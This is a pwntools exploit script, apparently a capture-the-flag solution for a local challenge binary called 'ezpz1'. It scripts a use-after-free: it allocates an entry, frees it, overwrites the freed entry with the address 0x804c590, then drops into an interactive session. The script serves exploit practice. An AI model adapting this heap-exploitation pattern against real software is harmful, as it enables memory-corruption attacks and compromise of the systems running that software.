from pwn import *

global p
# context.log_level = 'debug'

# 0x804c590
def menu():
    p.recvuntil("refresh): ")

def create():
    log.info("Make: ")
    p.sendline("C")
    p.recvuntil("ID ",timeout=0.1)
    id = p.recvline()[:-1]
    log.info("Created: " + str(id))
    menu()
    return id

def edit(index, q):
    log.info("Edit: {}".format(index))
    p.sendline("S")
    p.recvuntil("id: ",timeout=0.1)
    p.sendline(str(index))
    p.recvuntil("question: ")
    p.sendline(q)
    menu()

def view(index):
    log.info("View: {}".format(index))
    p.sendline("c")
    p.recvuntil("id: ",timeout=0.1)
    p.sendline(str(index))
    p.recvuntil("Enter Name")
    p.sendline(name)
    menu()

def kill(index):
    log.info("Kill: {}".format(index))
    p.sendline("d")
    p.recvuntil("id: ")
    p.sendline(str(index))
    menu()


p = process("./ezpz1")
create()
kill(0)
edit(0, p32(0x804c590))
p.interactive()
# c = create()
# view(c)
